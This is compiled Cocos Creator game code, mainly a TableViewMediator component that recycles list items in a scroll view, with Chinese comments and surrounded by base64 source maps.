cblxyXG5jb25zdCB7Y2NjbGFzcywgcHJvcGVydHl9ID0gY2MuX2RlY29yYXRvcjtcclxuXHJcbkBjY2NsYXNzXHJcbmV4cG9ydCBkZWZhdWx0IGNsYXNzIEJ1bGxldExpWmlQYW8gZXh0ZW5kcyBCdWxsZXQge1xyXG5cclxuICAgIHByaXZhdGUgX2Rpc3RhbmNlID0gMDtcclxuICAgIHByaXZhdGUgX3NwZWVkID0gMDtcclxuXHJcbiAgICBib29tKCl7XHJcbiAgICAgICAgbGV0IHBvd2VyTHYgPSBXb3JsZC5NeS5hcm1vcnkubGV2ZWxPZkVtaXR0ZXJQb3dlcih0aGlzLmJ1bGxldElkKTtcclxuICAgICAgICBsZXQgY29uZmlnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuV2VhcG9uVXApO1xyXG4gICAgICAgIGxldCBhZGQgPSBjb25maWdbcG93ZXJMdi0xXVsnYnVsbGV0X3NwbGl0J107XHJcbiAgICAgICAgbGV0IG51bSA9IDQgKyAyICogYWRkO1xyXG4gICAgICAgIGZvciAobGV0IGk9MDsgaTxudW07IGkrKyl7XHJcbiAgICAgICAgICAgIGxldCBkZWdyZWUgPSBpICogMzYwL251bTtcclxuICAgICAgICAgICAgbGV0IG5ld0J1bGxldCA9IHdpbmRvd1snR2FtZUJ1bGxldHNDb250cm9sbGVyJ10uZ2V0SW5hY3RpdmVCdWxsZXQoQnVsbGV0RW1pdHRlci5UWVBFUy5MaVppUGFvICsgMTAwKTtcclxuICAgICAgICAgICAgbmV3QnVsbGV0Lm5vZGUucm90YXRpb24gPSB0aGlzLm5vZGUucm90YXRpb24gKyBkZWdyZWU7XHJcbiAgICAgICAgICAgIGxldCBkaXIgPSBjYy52MigwLCAxKS5ub3JtYWxpemUoKS5yb3RhdGUoY2MubWlzYy5kZWdyZWVzVG9SYWRpYW5zKC1uZXdCdWxsZXQubm9kZS5yb3RhdGlvbikpO1xyXG4gICAgICAgICAgICBuZXdCdWxsZXQubm9kZS5wb3NpdGlvbiA9IHRoaXMubm9kZS5wb3NpdGlvbi5hZGQoZGlyLm11bCgxMzApKTtcclxuICAgICAgICAgICAgbmV3QnVsbGV0Lm5vZGUuYWN0aXZlID0gdHJ1ZTtcclxuXHJcbiAgICAgICAgICAgIG5ld0J1bGxldC5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5tb3ZlQnkodGhpcy5fZGlzdGFuY2UvdGhpcy5fc3BlZWQsIGRpci5tdWwodGhpcy5fZGlzdGFuY2UpKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgICAgIG5ld0J1bGxldC5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgICAgICB9KSkpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBmbHkoZGlyOiBjYy5WZWMyLCBkaXN0YW5jZTogbnVtYmVyLCBzcGVlZDogbnVtYmVyKTogdm9pZCB7XHJcbiAgICAgICAgdGhpcy5fZGlzdGFuY2UgPSBkaXN0YW5jZTtcclxuICAgICAgICB0aGlzLl9zcGVlZCA9IHNwZWVkO1xyXG4gICAgICAgIHRoaXMubm9kZS5yb3RhdGlvbiA9IDkwIC0gY2MubWlzYy5yYWRpYW5zVG9EZWdyZWVzKE1hdGguYXRhbjIoZGlyLnksIGRpci54KSk7XHJcbiAgICAgICAgdGhpcy5ub2RlLnJ1bkFjdGlvbihjYy5zZXF1ZW5jZShjYy5tb3ZlQnkoZGlzdGFuY2Uvc3BlZWQsIGRpci5tdWwoZGlzdGFuY2UpKSwgY2MuY2FsbEZ1bmMoKCk9PntcclxuICAgICAgICAgICAgdGhpcy5ub2RlLmFjdGl2ZSA9IGZhbHNlO1xyXG4gICAgICAgIH0pKSk7XHJcbiAgICB9XHJcblxyXG4gICAgcHJvdGVjdGVkIGNvbGxpc2lvbkVuZW15KG90aGVyLCBzZWxmKTogdm9pZCB7XHJcbiAgICAgICAgc3VwZXIuY29sbGlzaW9uRW5lbXkob3RoZXIsIHNlbGYpO1xyXG4gICAgICAgIHRoaXMuYm9vbSgpO1xyXG4gICAgfVxyXG5cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/framework/tableview/TableViewMediator.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '579ceeOw5xKP6NamQb0EmS/', 'TableViewMediator');
// framework/tableview/TableViewMediator.ts

// Learn TypeScript:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/typescript.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/reference/attributes.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - [Chinese] http://docs.cocos.com/creator/manual/zh/scripting/life-cycle-callbacks.html
//  - [English] http://www.cocos2d-x.org/docs/creator/manual/en/scripting/life-cycle-callbacks.html
/**
 * 使用TableView注意事项:
 * 1.设置mask 设置锚点(0, 1)  添加widget并设置top bottom left right都为0
 * 2.设置content 设置锚点(0, 1)  添加widget并设置top left right都为0
 * 3.设置itemNode  设置大小(w,h)　设置锚点(0, 0.5)
 * **/
Object.defineProperty(exports, "__esModule", { value: true });
var AbstractTableItem_1 = require("./AbstractTableItem");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property, menu = _a.menu, requireComponent = _a.requireComponent, disallowMultiple = _a.disallowMultiple, executionOrder = _a.executionOrder;
var TableViewMediator = /** @class */ (function (_super) {
    __extends(TableViewMediator, _super);
    function TableViewMediator() {
        var _this = _super !== null && _super.apply(this, arguments) || this;
        _this.scrollView = null;
        _this.template = null;
        _this.marginTop = 0;
        _this.marginBottom = 0;
        _this.margin = 0;
        _this.testNum = 0;
        _this.itemAction = false;
        _this.itemHeight = 0;
        _this.list = [];
        _this.firstIndex = 0;
        _this.firstIndexMax = 0;
        _this._datas = [];
        // LIFE-CYCLE CALLBACKS:
        _this.createNodesFinish = false;
        return _this;
    }
    TableViewMediator.prototype.createNodesListener = function (listener) {
        if (this.createNodesFinish) {
            listener();
        }
        else {
            this.node.on("CreateNodesSuccess", function () {
                listener();
            });
        }
    };
    Object.defineProperty(TableViewMediator.prototype, "datas", {
        get: function () {
            return this._datas;
        },
        set: function (value) {
            var _this = this;
            /** 计算最大firstIndexMax */
            this.createNodesListener(function () {
                var num = Math.ceil((_this.scrollView.node.getContentSize().height - _this.marginTop - _this.marginBottom + _this.margin) / (_this.itemHeight + _this.margin));
                _this.firstIndexMax = value.length - num - 1;
                // console.log(this.firstIndexMax,datas.length, this.list.length, num, "wxSub this.firstIndexMax************");
                _this._datas = value.slice(0);
                // this.datas = [1,2,3,4,5,6,7,8,9];
                _this.scrollView.content.height = _this.marginTop + _this.marginBottom + _this.itemHeight * _this._datas.length + _this.margin * (_this._datas.length - 1);
                _this.firstIndex = 0;
                _this.scrollView.scrollToTop();
                _this.list.forEach(function (value1, index) {
                    value1.y = -_this.marginTop - value1.height / 2 - index * (value1.height + _this.margin);
                    if (index >= _this._datas.length) {
                        value1.active = false;
                    }
                });
                _this.updateData();
                if (_this.itemAction) {
                    _this.showAction();
                }
            });
        },
        enumerable: false,
        configurable: true
    });
    TableViewMediator.prototype.createNode = function () {
        var node = cc.instantiate(this.template.node);
        node.active = false;
        this.itemHeight = node.getContentSize().height;
        node.x = 0;
        node.setParent(this.scrollView.content);
        this.list.push(node);
        return node;
    };
    TableViewMediator.prototype.addNode = function (height) {
        var _this = this;
        if (height <= this.scrollView.node.getContentSize().height) {
            this.node.runAction(cc.sequence(cc.delayTime(0), cc.callFunc(function () {
                var node = _this.createNode();
                node.y = -height - _this.itemHeight / 2;
                height += _this.itemHeight + _this.margin;
                _this.addNode(height);
            })));
        }
        else {
            var node = this.createNode();
            node.y = -height - this.itemHeight / 2;
            var eventHandler = new cc.Component.EventHandler();
            eventHandler.target = this.node; //这个 node 节点是你的事件处理代码组件所属的节点
            eventHandler.component = "TableViewMediator";
            eventHandler.handler = "onScrollEvent";
            eventHandler.customEventData = "";
            this.scrollView.scrollEvents.push(eventHandler);
            if (!this.createNodesFinish) {
                this.createNodesFinish = true;
                this.node.emit("CreateNodesSuccess");
            }
        }
    };
    TableViewMediator.prototype.onLoad = function () {
        this.scrollView = this.node.getComponent(cc.ScrollView);
        // let eventHandler = new cc.Component.EventHandler();
        // eventHandler.target = this.node; //这个 node 节点是你的事件处理代码组件所属的节点
        // eventHandler.component = "TableViewMediator";
        // eventHandler.handler = "onScrollEvent";
        // eventHandler.customEventData = "";
        // this.scrollView.scrollEvents.push(eventHandler);
        // let itemNode = cc.instantiate(this.template.node);
        // itemNode.active = false;
        // this.itemHeight = itemNode.getContentSize().height;
        // let itemHeightHalf = this.itemHeight/2;
        // /** 计算出view能装下多少个item */
        // let viewSize = this.scrollView.node.getContentSize();
        // let content = this.scrollView.content;
        //
        // let height = this.marginTop;
        // while (true){
        //     if (height > viewSize.height){
        //         break;
        //     }
        //
        //     let node = cc.instantiate(itemNode);
        //     node.x = 0;
        //     node.y = -height - itemHeightHalf;
        //     node.setParent(content);
        //     this.list.push(node);
        //     height += this.itemHeight + this.margin;
        //     // console.log("wx sub===>node.y", node.y);
        // }
        //
        // itemNode.x = 0;
        // itemNode.y = -height - itemHeightHalf;
        // itemNode.setParent(content);
        // this.list.push(itemNode);
        this.addNode(this.marginTop);
        /** 延迟判断 */
        // let self = this;
        // this.scheduleOnce(function () {
        //     self._adjustList();
        // }, 0.1);
        if (this.testNum > 0) {
            var test = [];
            for (var i = 0; i < this.testNum; i++) {
                test.push(i + 1);
            }
            this.datas = test;
        }
    };
    TableViewMediator.prototype._adjustList = function () {
        var viewSize = this.scrollView.node.getContentSize();
        var content = this.scrollView.content;
        var itemHeightHalf = this.itemHeight / 2;
        var height = this.marginTop + (this.itemHeight + this.margin) * this.list.length - this.margin;
        while (height < viewSize.height + this.itemHeight) {
            var node = cc.instantiate(this.template.node);
            node.active = false;
            node.x = 0;
            node.y = -height - itemHeightHalf;
            node.setParent(content);
            this.list.push(node);
            height += this.itemHeight + this.margin;
            if (this._datas.length >= this.list.length) {
                var index = this.list.length - 1;
                var value = this.list[index];
                value.active = true;
                this.updateItem(value, index);
            }
        }
        if (this._datas.length > 0) {
            var num = Math.ceil((viewSize.height - this.marginTop - this.marginBottom + this.margin) / (this.itemHeight + this.margin));
            this.firstIndexMax = this._datas.length - num - 1;
        }
    };
    TableViewMediator.prototype.updateData = function () {
        var arr = this.list.slice(0, Math.min(this._datas.length, this.list.length));
        this.updateItems(arr, 0);
    };
    TableViewMediator.prototype.showAction = function () {
        this.list.slice(0, Math.min(this._datas.length, this.list.length)).forEach(function (value, index) {
            value.scaleX = 0;
            if (value.active) {
                value.runAction(cc.scaleTo(0.3 + (0.08 * index), 1).easing(cc.easeCubicActionInOut()));
            }
            else {
                var comp_1 = value.addComponent(cc.Component);
                comp_1['onEnable'] = function () {
                    value.runAction(cc.scaleTo(0.3 + (0.08 * index), 1).easing(cc.easeCubicActionInOut()));
                };
                comp_1['onDisable'] = function () {
                    comp_1.destroy();
                };
            }
        });
    };
    TableViewMediator.prototype.updateItems = function (arr, index) {
        var _this = this;
        if (index < arr.length) {
            this.node.runAction(cc.sequence(cc.delayTime(0), cc.callFunc(function () {
                var node = arr[index];
                node.active = true;
                _this.updateItem(node, _this.firstIndex + index);
                _this.updateItems(arr, index + 1);
            })));
        }
    };
    TableViewMediator.prototype.updateItem = function (node, index) {
        var value = this._datas[index];
        var itemMediator = node.getComponent(AbstractTableItem_1.default);
        itemMediator.upadteItem(value, index);
    };
    TableViewMediator.prototype.onScrollEvent = function (event) {
        // console.log(event, "event");
        var content = this.scrollView.content;
        // let contentHeight = content.getContentSize().height;
        var viewHeight = this.scrollView.node.getContentSize().height;
        /*if ((!this.scrollView.isAutoScrolling() && !this.scrollView.isScrolling()) || content.y < 0 || content.y >= contentHeight - viewHeight){
            return;
        }*/
        var contentY = content.y;
        // console.log(contentY, "contentY");
        /** 判断第1个元素 和 倒数第1个元素的位置 */
        /** 上边界 */
        var itemHeightHalf = this.itemHeight / 2;
        /** 头插入 */
        while (this.firstIndex > 0 && this.list[0].y + this.marginTop + itemHeightHalf < -contentY) {
            var last = this.list.pop();
            last.y = this.list[0].y + this.itemHeight + this.margin;
            this.list.unshift(last);
            this.firstIndex--;
            // console.log("===========>尾移头");
            this.updateItem(last, this.firstIndex);
        }
        /** 尾插入 */
        while (this.firstIndex < this.firstIndexMax && this.list[this.list.length - 1].y - itemHeightHalf - this.marginBottom > -contentY - viewHeight) {
            var first = this.list.shift();
            first.y = this.list[this.list.length - 1].y - this.itemHeight - this.margin;
            this.list.push(first);
            this.firstIndex++;
            // console.log("===========>头移尾", this.list[this.list.length-1].y);
            this.updateItem(first, this.firstIndex + this.list.length - 1);
        }
    };
    __decorate([
        property(AbstractTableItem_1.default)
    ], TableViewMediator.prototype, "template", void 0);
    __decorate([
        property({ type: cc.Integer })
    ], TableViewMediator.prototype, "marginTop", void 0);
    __decorate([
        property({ type: cc.Integer })
    ], TableViewMediator.prototype, "marginBottom", void 0);
    __decorate([
        property({ type: cc.Integer })
    ], TableViewMediator.prototype, "margin", void 0);
    __decorate([
        property
    ], TableViewMediator.prototype, "testNum", void 0);
    __decorate([
        property
    ], TableViewMediator.prototype, "itemAction", void 0);
    TableViewMediator = __decorate([
        ccclass,
        menu("自定义/TableViewMediator"),
        requireComponent(cc.ScrollView),
        disallowMultiple,
        executionOrder(-10)
    ], TableViewMediator);
    return TableViewMediator;
}(cc.Component));
exports.default = TableViewMediator;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9mcmFtZXdvcmsvdGFibGV2aWV3L1RhYmxlVmlld01lZGlhdG9yLnRzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7Ozs7Ozs7OztBQUFBLG9CQUFvQjtBQUNwQixpRkFBaUY7QUFDakYseUZBQXlGO0FBQ3pGLG1CQUFtQjtBQUNuQiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HLDhCQUE4QjtBQUM5QiwyRkFBMkY7QUFDM0YsbUdBQW1HO0FBQ25HOzs7OztNQUtNOztBQUVOLHlEQUFvRDtBQUU5QyxJQUFBLEtBQStFLEVBQUUsQ0FBQyxVQUFVLEVBQTNGLE9BQU8sYUFBQSxFQUFFLFFBQVEsY0FBQSxFQUFDLElBQUksVUFBQSxFQUFFLGdCQUFnQixzQkFBQSxFQUFFLGdCQUFnQixzQkFBQSxFQUFFLGNBQWMsb0JBQWlCLENBQUM7QUFPbkc7SUFBK0MscUNBQVk7SUFBM0Q7UUFBQSxxRUFtUUM7UUFqUUcsZ0JBQVUsR0FBaUIsSUFBSSxDQUFDO1FBR2hDLGNBQVEsR0FBcUIsSUFBSSxDQUFDO1FBR2xDLGVBQVMsR0FBRyxDQUFDLENBQUM7UUFHZCxrQkFBWSxHQUFHLENBQUMsQ0FBQztRQUdqQixZQUFNLEdBQUcsQ0FBQyxDQUFDO1FBR1gsYUFBTyxHQUFHLENBQUMsQ0FBQztRQUdaLGdCQUFVLEdBQVcsS0FBSyxDQUFDO1FBR25CLGdCQUFVLEdBQUcsQ0FBQyxDQUFDO1FBRXZCLFVBQUksR0FBa0IsRUFBRSxDQUFDO1FBRWpCLGdCQUFVLEdBQUcsQ0FBQyxDQUFDO1FBRWYsbUJBQWEsR0FBRyxDQUFDLENBQUM7UUFFbEIsWUFBTSxHQUFHLEVBQUUsQ0FBQztRQUNwQix3QkFBd0I7UUFFaEIsdUJBQWlCLEdBQUcsS0FBSyxDQUFDOztJQWlPdEMsQ0FBQztJQS9OVywrQ0FBbUIsR0FBM0IsVUFBNEIsUUFBaUI7UUFDekMsSUFBSSxJQUFJLENBQUMsaUJBQWlCLEVBQUM7WUFDdkIsUUFBUSxFQUFFLENBQUM7U0FDZDthQUFLO1lBQ0YsSUFBSSxDQUFDLElBQUksQ0FBQyxFQUFFLENBQUMsb0JBQW9CLEVBQUU7Z0JBQy9CLFFBQVEsRUFBRSxDQUFDO1lBQ2YsQ0FBQyxDQUFDLENBQUM7U0FDTjtJQUNMLENBQUM7SUFFRCxzQkFBSSxvQ0FBSzthQUFUO1lBQ0ksT0FBTyxJQUFJLENBQUMsTUFBTSxDQUFDO1FBQ3ZCLENBQUM7YUFFRCxVQUFVLEtBQVk7WUFBdEIsaUJBdUJDO1lBdEJHLHdCQUF3QjtZQUN4QixJQUFJLENBQUMsbUJBQW1CLENBQUM7Z0JBQ3JCLElBQUksR0FBRyxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQyxLQUFJLENBQUMsVUFBVSxDQUFDLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQyxNQUFNLEdBQUcsS0FBSSxDQUFDLFNBQVMsR0FBRyxLQUFJLENBQUMsWUFBWSxHQUFHLEtBQUksQ0FBQyxNQUFNLENBQUMsR0FBRyxDQUFDLEtBQUksQ0FBQyxVQUFVLEdBQUMsS0FBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUM7Z0JBQ3ZKLEtBQUksQ0FBQyxhQUFhLEdBQUcsS0FBSyxDQUFDLE1BQU0sR0FBRyxHQUFHLEdBQUcsQ0FBQyxDQUFDO2dCQUM1QywrR0FBK0c7Z0JBRS9HLEtBQUksQ0FBQyxNQUFNLEdBQUcsS0FBSyxDQUFDLEtBQUssQ0FBQyxDQUFDLENBQUMsQ0FBQztnQkFDN0Isb0NBQW9DO2dCQUNwQyxLQUFJLENBQUMsVUFBVSxDQUFDLE9BQU8sQ0FBQyxNQUFNLEdBQUcsS0FBSSxDQUFDLFNBQVMsR0FBRyxLQUFJLENBQUMsWUFBWSxHQUFHLEtBQUksQ0FBQyxVQUFVLEdBQUcsS0FBSSxDQUFDLE1BQU0sQ0FBQyxNQUFNLEdBQUcsS0FBSSxDQUFDLE1BQU0sR0FBRyxDQUFDLEtBQUksQ0FBQyxNQUFNLENBQUMsTUFBTSxHQUFHLENBQUMsQ0FBQyxDQUFDO2dCQUNwSixLQUFJLENBQUMsVUFBVSxHQUFHLENBQUMsQ0FBQztnQkFDcEIsS0FBSSxDQUFDLFVBQVUsQ0FBQyxXQUFXLEVBQUUsQ0FBQztnQkFDOUIsS0FBSSxDQUFDLElBQUksQ0FBQyxPQUFPLENBQUMsVUFBQyxNQUFNLEVBQUUsS0FBSztvQkFDNUIsTUFBTSxDQUFDLENBQUMsR0FBRyxDQUFDLEtBQUksQ0FBQyxTQUFTLEdBQUcsTUFBTSxDQUFDLE1BQU0sR0FBQyxDQUFDLEdBQUcsS0FBSyxHQUFHLENBQUMsTUFBTSxDQUFDLE1BQU0sR0FBRyxLQUFJLENBQUMsTUFBTSxDQUFDLENBQUM7b0JBQ3JGLElBQUksS0FBSyxJQUFJLEtBQUksQ0FBQyxNQUFNLENBQUMsTUFBTSxFQUFDO3dCQUM1QixNQUFNLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztxQkFDekI7Z0JBQ0wsQ0FBQyxDQUFDLENBQUM7Z0JBQ0gsS0FBSSxDQUFDLFVBQVUsRUFBRSxDQUFDO2dCQUNsQixJQUFJLEtBQUksQ0FBQyxVQUFVLEVBQUM7b0JBQ2hCLEtBQUksQ0FBQyxVQUFVLEVBQUUsQ0FBQztpQkFDckI7WUFDTCxDQUFDLENBQUMsQ0FBQztRQUNQLENBQUM7OztPQXpCQTtJQTJCTyxzQ0FBVSxHQUFsQjtRQUNJLElBQUksSUFBSSxHQUFHLEVBQUUsQ0FBQyxXQUFXLENBQUMsSUFBSSxDQUFDLFFBQVEsQ0FBQyxJQUFJLENBQUMsQ0FBQztRQUM5QyxJQUFJLENBQUMsTUFBTSxHQUFHLEtBQUssQ0FBQztRQUNwQixJQUFJLENBQUMsVUFBVSxHQUFHLElBQUksQ0FBQyxjQUFjLEVBQUUsQ0FBQyxNQUFNLENBQUM7UUFDL0MsSUFBSSxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUM7UUFDWCxJQUFJLENBQUMsU0FBUyxDQUFDLElBQUksQ0FBQyxVQUFVLENBQUMsT0FBTyxDQUFDLENBQUM7UUFDeEMsSUFBSSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLENBQUM7UUFDckIsT0FBTyxJQUFJLENBQUM7SUFDaEIsQ0FBQztJQUVPLG1DQUFPLEdBQWYsVUFBZ0IsTUFBYTtRQUE3QixpQkFzQkM7UUFyQkcsSUFBSSxNQUFNLElBQUksSUFBSSxDQUFDLFVBQVUsQ0FBQyxJQUFJLENBQUMsY0FBYyxFQUFFLENBQUMsTUFBTSxFQUFDO1lBQ3ZELElBQUksQ0FBQyxJQUFJLENBQUMsU0FBUyxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUMsRUFBRSxDQUFDLFNBQVMsQ0FBQyxDQUFDLENBQUMsRUFBRSxFQUFFLENBQUMsUUFBUSxDQUFDO2dCQUN6RCxJQUFJLElBQUksR0FBRyxLQUFJLENBQUMsVUFBVSxFQUFFLENBQUM7Z0JBQzdCLElBQUksQ0FBQyxDQUFDLEdBQUcsQ0FBQyxNQUFNLEdBQUcsS0FBSSxDQUFDLFVBQVUsR0FBQyxDQUFDLENBQUM7Z0JBQ3JDLE1BQU0sSUFBSSxLQUFJLENBQUMsVUFBVSxHQUFHLEtBQUksQ0FBQyxNQUFNLENBQUM7Z0JBQ3hDLEtBQUksQ0FBQyxPQUFPLENBQUMsTUFBTSxDQUFDLENBQUM7WUFDekIsQ0FBQyxDQUFDLENBQUMsQ0FBQyxDQUFDO1NBQ1I7YUFBSztZQUNGLElBQUksSUFBSSxHQUFHLElBQUksQ0FBQyxVQUFVLEVBQUUsQ0FBQztZQUM3QixJQUFJLENBQUMsQ0FBQyxHQUFHLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQyxVQUFVLEdBQUMsQ0FBQyxDQUFDO1lBQ3JDLElBQUksWUFBWSxHQUFHLElBQUksRUFBRSxDQUFDLFNBQVMsQ0FBQyxZQUFZLEVBQUUsQ0FBQztZQUNuRCxZQUFZLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQyw0QkFBNEI7WUFDN0QsWUFBWSxDQUFDLFNBQVMsR0FBRyxtQkFBbUIsQ0FBQztZQUM3QyxZQUFZLENBQUMsT0FBTyxHQUFHLGVBQWUsQ0FBQztZQUN2QyxZQUFZLENBQUMsZUFBZSxHQUFHLEVBQUUsQ0FBQztZQUNsQyxJQUFJLENBQUMsVUFBVSxDQUFDLFlBQVksQ0FBQyxJQUFJLENBQUMsWUFBWSxDQUFDLENBQUM7WUFDaEQsSUFBSSxDQUFDLElBQUksQ0FBQyxpQkFBaUIsRUFBQztnQkFDeEIsSUFBSSxDQUFDLGlCQUFpQixHQUFHLElBQUksQ0FBQztnQkFDOUIsSUFBSSxDQUFDLElBQUksQ0FBQyxJQUFJLENBQUMsb0JBQW9CLENBQUMsQ0FBQzthQUN4QztTQUNKO0lBQ0wsQ0FBQztJQUVELGtDQUFNLEdBQU47UUFDSSxJQUFJLENBQUMsVUFBVSxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsWUFBWSxDQUFDLEVBQUUsQ0FBQyxVQUFVLENBQUMsQ0FBQztRQUN4RCxzREFBc0Q7UUFDdEQsZ0VBQWdFO1FBQ2hFLGdEQUFnRDtRQUNoRCwwQ0FBMEM7UUFDMUMscUNBQXFDO1FBQ3JDLG1EQUFtRDtRQUNuRCxxREFBcUQ7UUFDckQsMkJBQTJCO1FBQzNCLHNEQUFzRDtRQUN0RCwwQ0FBMEM7UUFDMUMsMkJBQTJCO1FBQzNCLHdEQUF3RDtRQUN4RCx5Q0FBeUM7UUFDekMsRUFBRTtRQUNGLCtCQUErQjtRQUMvQixnQkFBZ0I7UUFDaEIscUNBQXFDO1FBQ3JDLGlCQUFpQjtRQUNqQixRQUFRO1FBQ1IsRUFBRTtRQUNGLDJDQUEyQztRQUMzQyxrQkFBa0I7UUFDbEIseUNBQXlDO1FBQ3pDLCtCQUErQjtRQUMvQiw0QkFBNEI7UUFDNUIsK0NBQStDO1FBQy9DLGtEQUFrRDtRQUNsRCxJQUFJO1FBQ0osRUFBRTtRQUNGLGtCQUFrQjtRQUNsQix5Q0FBeUM7UUFDekMsK0JBQStCO1FBQy9CLDRCQUE0QjtRQUM1QixJQUFJLENBQUMsT0FBTyxDQUFDLElBQUksQ0FBQyxTQUFTLENBQUMsQ0FBQztRQUU3QixXQUFXO1FBQ1gsbUJBQW1CO1FBQ25CLGtDQUFrQztRQUNsQywwQkFBMEI7UUFDMUIsV0FBVztRQUNYLElBQUksSUFBSSxDQUFDLE9BQU8sR0FBRyxDQUFDLEVBQUM7WUFDakIsSUFBSSxJQUFJLEdBQUcsRUFBRSxDQUFDO1lBQ2QsS0FBSyxJQUFJLENBQUMsR0FBQyxDQUFDLEVBQUUsQ0FBQyxHQUFDLElBQUksQ0FBQyxPQUFPLEVBQUUsQ0FBQyxFQUFFLEVBQUM7Z0JBQzlCLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQyxHQUFDLENBQUMsQ0FBQyxDQUFDO2FBQ2xCO1lBQ0QsSUFBSSxDQUFDLEtBQUssR0FBRyxJQUFJLENBQUM7U0FDckI7SUFDTCxDQUFDO0lBRUQsdUNBQVcsR0FBWDtRQUNJLElBQUksUUFBUSxHQUFHLElBQUksQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLGNBQWMsRUFBRSxDQUFDO1FBQ3JELElBQUksT0FBTyxHQUFHLElBQUksQ0FBQyxVQUFVLENBQUMsT0FBTyxDQUFDO1FBQ3RDLElBQUksY0FBYyxHQUFHLElBQUksQ0FBQyxVQUFVLEdBQUMsQ0FBQyxDQUFDO1FBQ3ZDLElBQUksTUFBTSxHQUFHLElBQUksQ0FBQyxTQUFTLEdBQUcsQ0FBQyxJQUFJLENBQUMsVUFBVSxHQUFHLElBQUksQ0FBQyxNQUFNLENBQUMsR0FBRyxJQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sR0FBSSxJQUFJLENBQUMsTUFBTSxDQUFDO1FBQ2hHLE9BQU8sTUFBTSxHQUFHLFFBQVEsQ0FBQyxNQUFNLEdBQUcsSUFBSSxDQUFDLFVBQVUsRUFBQztZQUM5QyxJQUFJLElBQUksR0FBRyxFQUFFLENBQUMsV0FBVyxDQUFDLElBQUksQ0FBQyxRQUFRLENBQUMsSUFBSSxDQUFDLENBQUM7WUFDOUMsSUFBSSxDQUFDLE1BQU0sR0FBRyxLQUFLLENBQUM7WUFDcEIsSUFBSSxDQUFDLENBQUMsR0FBRyxDQUFDLENBQUM7WUFDWCxJQUFJLENBQUMsQ0FBQyxHQUFHLENBQUMsTUFBTSxHQUFHLGNBQWMsQ0FBQztZQUNsQyxJQUFJLENBQUMsU0FBUyxDQUFDLE9BQU8sQ0FBQyxDQUFDO1lBQ3hCLElBQUksQ0FBQyxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO1lBQ3JCLE1BQU0sSUFBSSxJQUFJLENBQUMsVUFBVSxHQUFHLElBQUksQ0FBQyxNQUFNLENBQUM7WUFDeEMsSUFBSSxJQUFJLENBQUMsTUFBTSxDQUFDLE1BQU0sSUFBSSxJQUFJLENBQUMsSUFBSSxDQUFDLE1BQU0sRUFBQztnQkFDdkMsSUFBSSxLQUFLLEdBQUcsSUFBSSxDQUFDLElBQUksQ0FBQyxNQUFNLEdBQUMsQ0FBQyxDQUFDO2dCQUMvQixJQUFJLEtBQUssR0FBRSxJQUFJLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDO2dCQUM1QixLQUFLLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQztnQkFDcEIsSUFBSSxDQUFDLFVBQVUsQ0FBQyxLQUFLLEVBQUUsS0FBSyxDQUFDLENBQUM7YUFDakM7U0FDSjtRQUNELElBQUksSUFBSSxDQUFDLE1BQU0sQ0FBQyxNQUFNLEdBQUcsQ0FBQyxFQUFDO1lBQ3ZCLElBQUksR0FBRyxHQUFHLElBQUksQ0FBQyxJQUFJLENBQUMsQ0FBQyxRQUFRLENBQUMsTUFBTSxHQUFHLElBQUksQ0FBQyxTQUFTLEdBQUcsSUFBSSxDQUFDLFlBQVksR0FBRyxJQUFJLENBQUMsTUFBTSxDQUFDLEdBQUcsQ0FBQyxJQUFJLENBQUMsVUFBVSxHQUFDLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDO1lBQzFILElBQUksQ0FBQyxhQUFhLEdBQUcsSUFBSSxDQUFDLE1BQU0sQ0FBQyxNQUFNLEdBQUcsR0FBRyxHQUFHLENBQUMsQ0FBQztTQUNyRDtJQUNMLENBQUM7SUFFRCxzQ0FBVSxHQUFWO1F